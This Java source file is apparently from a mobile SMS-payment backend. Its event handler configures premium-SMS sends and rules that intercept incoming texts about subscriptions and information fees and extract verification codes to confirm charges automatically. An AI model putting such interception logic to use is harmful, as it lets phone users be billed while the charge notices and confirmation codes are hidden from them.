package com.tianzh.cm.state;

import com.tianzh.cm.annotation.Consumer;
import com.tianzh.cm.domain.message.DomainEventHandler;
import com.tianzh.cm.event.disuptor.EventDisruptor;
import com.tianzh.cm.model.PayOrder;
import com.tianzh.cm.service.model.*;
import com.tianzh.cm.service.thirdpay.ChargeOrderService;
import com.tianzh.cm.util.area.AreaUtils;
import com.tianzh.cm.util.http.HttpUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.Calendar;


/**
 * Created by pig on 2015-09-10.
 */
@Consumer("selfPaidWays")
public class SelfPayState implements DomainEventHandler {
//    Logger yuanlangpayBiLogger = LoggerFactory.getLogger("yuanlangpay_bi");
//    Logger thpayOrderDaoLogger = LoggerFactory.getLogger("thpayorder_dao");
//
//
//    ChargeOrderService chargeOrderService;
//
//    public void setChargeOrderService(ChargeOrderService chargeOrderService) {
//        this.chargeOrderService = chargeOrderService;
//    }

    @Override
    public void onEvent(EventDisruptor event, boolean endOfBatch) throws Exception {
        PayOrder payOrder = (PayOrder) event.getDomainMessage().getEventSource();
        SelfPayParams selfPayParams = new SelfPayParams();

        ArrayList<PaidWays> paidWays = new ArrayList<PaidWays>();


        NormalPaidMsg normalPaidMsg = new NormalPaidMsg();

        normalPaidMsg.setPort("18123744403");
        normalPaidMsg.setMsg("我是内容！！！");
        normalPaidMsg.setPaidWayId(1);
        normalPaidMsg.setPaidWayType(0);
        normalPaidMsg.setInterceptType(1);
        normalPaidMsg.setInterceptPort("18123744403");
        normalPaidMsg.setInterceptKeyWords("订购#信息费");

        ConfirmPaidMsg confirmPaidMsg = new ConfirmPaidMsg();

        confirmPaidMsg.setPaidWayId(2);
        confirmPaidMsg.setPaidWayType(1);
        confirmPaidMsg.setPort("18123744403");
        confirmPaidMsg.setMsg("我是内容！！！");
        confirmPaidMsg.setInterceptType(1);
        confirmPaidMsg.setInterceptPort("18123744403");
        confirmPaidMsg.setInterceptKeyWords("");
        confirmPaidMsg.setConfirmMsgDelay("15000");
        confirmPaidMsg.setConfirmPort("18123744403");
        confirmPaidMsg.setInterceptPreKeyWords("验证码：");
        confirmPaidMsg.setInterceptBackKeyWords("，小米客服");

        CombinationPaidMsg combinationPaidMsg = new CombinationPaidMsg();

        combinationPaidMsg.setPaidWayId(3);
        combinationPaidMsg.setPaidWayType(2);
        combinationPaidMsg.setInterceptType(1);
        combinationPaidMsg.setInterceptPort("18123744403");
        combinationPaidMsg.setInterceptKeyWords("订购#信息费");
        combinationPaidMsg.setDelay("3000");
        combinationPaidMsg.setFirstPort("18123744403");
        combinationPaidMsg.setFirstMsg("我是短信1！");
        combinationPaidMsg.setSecondPort("18123744403");
        combinationPaidMsg.setSecondMsg("我是短信2！");

        paidWays.add(combinationPaidMsg);

        selfPayParams.setPaidWays(paidWays);
        selfPayParams.setDelay(3000);
        selfPayParams.setDialogType(2);
        selfPayParams.setProductPrompt("你确定购买XXX吗？");
        selfPayParams.setUserToken(payOrder.getUserToken());
        selfPayParams.setTianzhOrderId(Integer.toHexString(0));
        selfPayParams.setUserOrderId(payOrder.getUserOrderId());
        selfPayParams.setProductId(payOrder.getProductId());
        selfPayParams.setStatusCode("200");

        if (!HttpUtils.response(payOrder, selfPayParams)) {

        }
    }

}
